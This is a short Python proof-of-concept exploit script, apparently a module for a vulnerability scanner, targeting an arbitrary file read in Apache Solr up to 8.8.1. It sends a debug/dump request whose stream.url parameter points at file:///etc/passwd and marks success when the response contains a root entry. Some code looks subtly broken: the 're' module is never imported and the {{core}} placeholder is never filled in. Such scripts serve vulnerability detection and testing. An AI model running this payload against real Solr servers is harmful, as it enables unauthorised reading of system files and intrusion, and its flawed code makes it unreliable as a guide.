import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Solr <= 8.8.1 Arbitrary File Read''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://twitter.com/Al1ex4/status/1382981479727128580", 
            "https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/", 
            "https://twitter.com/sec715/status/1373472323538362371"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["apache", "solr", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/solr/admin/cores?wt=json"""
        method = "GET"
        data = """"""
        headers = {'Accept-Language': 'en', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream"""
        method = "GET"
        data = """"""
        headers = {'Accept-Language': 'en', 'Connection': 'close'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and (re.search(r"""root:.*:0:0:""",resp1.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url